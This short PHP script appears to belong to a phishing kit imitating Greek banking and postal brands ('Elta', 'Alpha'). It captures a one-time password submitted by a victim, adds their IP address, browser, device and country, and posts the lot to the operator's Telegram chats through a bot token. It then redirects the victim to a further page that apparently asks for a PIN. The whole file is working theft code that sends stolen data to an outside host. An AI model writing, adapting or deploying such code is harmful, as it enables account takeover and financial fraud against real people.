<?php
    include "../config.php";
   if(isset($_POST['get'])){
   $ip = getenv("REMOTE_ADDR");
       $message = "-------------------- 🏦 Elta Alpha OTP 🏦 -------------------\nOTP : ".$_POST['otp']."\nBrowser : ".$br."\nDevice : ".$os."\nCountry : ".$Country."\nIP      : ".$ip."\nURL     : ".$url."\n-------------------- 🇬🇷 Zoldyck 🇬🇷-------------------\n";
      foreach($user_ids as $user_id) {
      $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
      $data=array('chat_id'=>$user_id,'text'=>$message);
      $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
      $context=stream_context_create($options);
      $result=file_get_contents($url,false,$context);
      
      }
      header("Location: ../loading.php?id=$ip&page=alphapin.php?id=".generateRandomString());
      }
      ?>